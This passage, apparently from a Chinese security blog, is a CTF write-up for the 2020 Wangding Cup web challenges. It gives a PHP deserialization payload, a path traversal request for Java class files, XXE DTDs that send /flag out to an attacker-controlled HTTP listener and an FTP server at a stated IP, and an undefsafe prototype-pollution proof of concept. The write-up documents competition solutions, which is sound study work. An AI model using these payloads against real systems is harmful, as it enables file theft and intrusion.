@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020年网鼎杯WEB-writeup |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020年网鼎杯writeup" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020年网鼎杯WEB-writeup
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/" class="article-date">
+  <time datetime="2020-05-10T11:49:29.000Z" itemprop="datePublished">2020-05-10</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>被队友带飞，队友👍👍👍</p>
+<a id="more"></a>
+
+<h1 id="0x01-AreUSerialz"><a href="#0x01-AreUSerialz" class="headerlink" title="0x01 AreUSerialz"></a>0x01 AreUSerialz</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op = <span class="number">2</span>;</span><br><span class="line">$a-&gt;filename = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>很意外为啥把上面的3改成2就好了，</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510195659225.png" alt="image-20200510195659225"></p>
+<p>然后在本地试了试，好像跟php的版本和SAPI有关，</p>
+<p>php以cli方式运行时候是不用修改3变成2的，本地测试php7.2.1和7.3.15版本将protected改成public属性是可以成功的，其他版本不可以</p>
+<ul>
+<li>php 7.2.1</li>
+</ul>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103022778.png" alt="image-20200511103022778"></p>
+<ul>
+<li>php 7.1.13</li>
+</ul>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103058029.png" alt="image-20200511103058029"></p>
+<ul>
+<li>php 5.3.29</li>
+</ul>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103127750.png" alt="image-20200511103127750"></p>
+<p>然后本地7版本时候，不用把3改成2也可以，但是在题目环境不改3的话不能成功。虚拟机里也是和题目环境一样。</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510201328743.png" alt="image-20200510201328743"></p>
+<p>win 10 phpstudy php7.2.1</p>
+<p>ps：添加了一个var_dump(scandir(‘.’));输出的是php.exe的路径。</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510202256996.png" alt="image-20200510202256996"></p>
+<p>这里是sapi的原因(试了apache和nginx都不可以)，如果要读的话要用绝对路径</p>
+<blockquote>
+<p><strong>Note</strong>:</p>
+<p>析构函数在脚本关闭时调用，此时所有的 HTTP 头信息已经发出。脚本关闭时的工作目录有可能和在 SAPI（如 apache）中时不同。</p>
+<p><a href="https://www.php.net/manual/zh/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.decon.php</a></p>
+</blockquote>
+<p>另外如果把3改成2的话也是可以读的</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511095452622.png" alt="image-20200511095452622"></p>
+<p>phpstudy7.2.10外其他版本均读不了flag文件。</p>
+<p>后来看到p神之前分享过</p>
+<blockquote>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215419050.png" alt="image-20200511215419050"></p>
+<p><a href="https://blog.csdn.net/a3320315/article/details/105215741" target="_blank" rel="noopener">参考</a></p>
+</blockquote>
+<p>然后还有一种解法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">"\00*\00op"</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">"\00*\00filename"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;S:<span class="number">10</span>:<span class="string">"\00*\00content"</span>;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215516506.png" alt="image-20200511215516506"></p>
+<h1 id="0x02-filejava"><a href="#0x02-filejava" class="headerlink" title="0x02 filejava"></a>0x02 filejava</h1><p>上传完文件可以看下载文件处有任意文件读取漏洞，</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214503572.png" alt="image-20200510214503572"></p>
+<p>都配置文件</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214652887.png" alt="image-20200510214652887"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>file_in_java<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>upload.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>读class文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214948845.png" alt="image-20200510214948845"></p>
+<p>下载下来反编译，</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510215207185.png" alt="image-20200510215207185"></p>
+<p>看到poi-ooxml-3.10 has something wrong，之前做swpu的时候就有这个的xxe，可以说是原题，比那个还简单点，新建一个excel文件，然后用压缩包打开，修改里面的[Content_Types].xml,</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510221931914.png" alt="image-20200510221931914"></p>
+<p>然后在vps上gx.dtd，上次高校战役Java xxe的文件，，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<p>然后监听9999端口，</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222245930.png" alt="image-20200510222245930"></p>
+<p>也可以用ftp读</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222359786.png" alt="image-20200510222359786"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://144.34.200.151:2121/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222721778.png" alt="image-20200510222721778"></p>
+<p>ps:可以看到这里java版本试1.8</p>
+<p><img src="https://mount4in.github.io/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140334086.png" alt="image-20200311140334086"></p>
+<p><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a></p>
+<h1 id="0x03-notes"><a href="#0x03-notes" class="headerlink" title="0x03 notes"></a>0x03 notes</h1><p>原型链污染，undefsafe包有bug</p>
+<p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure>
+
+<p>题目源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>
+
+<p>本地测试下</p>
